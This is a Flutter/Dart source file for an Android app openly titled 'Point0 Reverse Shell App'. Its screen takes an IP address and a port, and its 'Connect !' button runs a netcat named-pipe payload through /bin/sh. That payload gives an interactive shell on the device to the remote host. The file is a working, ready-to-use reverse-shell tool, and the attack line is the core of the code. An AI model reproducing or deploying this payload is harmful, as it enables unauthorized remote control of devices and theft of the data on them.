import 'dart:io';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter/material.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: MainPage(),
    );
  }
}

// ignore: must_be_immutable
class MainPage extends StatelessWidget {
  MainPage({super.key});

  String serverIp = "";
  int serverPort = 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        appBar: PreferredSize(
            preferredSize: const Size.fromHeight(50.0),
            child: AppBar(
              backgroundColor: Colors.red[100],
              centerTitle: true,
              title: Column(
                children: [
                  const Text(
                    "Point0",
                    style: TextStyle(
                        color: Colors.red,
                        fontSize: 25.0,
                        fontWeight: FontWeight.bold),
                  ),
                  Text(
                    "Reverse Shell App",
                    style: TextStyle(
                        fontSize: 12.0,
                        fontWeight: FontWeight.bold,
                        color: Colors.red[600]),
                  )
                ],
              ),
            )),
        body: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              TextField(
                autofocus: false,
                keyboardType: TextInputType.text,
                cursorColor: Colors.black,
                decoration: const InputDecoration(
                    hintText: "Ip Address", border: OutlineInputBorder()),
                onChanged: (value) {
                  serverIp = value;
                },
              ),
              const SizedBox(
                height: 7.0,
              ),
              TextField(
                autofocus: false,
                keyboardType: TextInputType.text,
                cursorColor: Colors.black,
                decoration: const InputDecoration(
                    hintText: "Port", border: OutlineInputBorder()),
                onChanged: (value) {
                  serverPort = int.parse(value);
                },
              ),
              RawMaterialButton(
                onPressed: () async {
                  PackageInfo packageInfo = await PackageInfo.fromPlatform();
                  String packageName = packageInfo.packageName;
                  String reverse_shell_payload =
                      "rm -f /data/data/$packageName/x; mknod /data/data/$packageName/x p; cat /data/data/$packageName/x|/system/bin/sh -i 2>&1|/system/bin/nc $serverIp $serverPort >/data/data/$packageName/x";

                  Process.run("/bin/sh", ["-c", reverse_shell_payload],
                      runInShell: true);
                },
                padding:
                    const EdgeInsets.symmetric(vertical: 5.0, horizontal: 7.0),
                child: const Text(
                  "Connect !",
                  style: TextStyle(
                    fontSize: 29.0,
                    color: Colors.blueGrey,
                  ),
                ),
              ),
            ],
          ),
        ));
  }
}

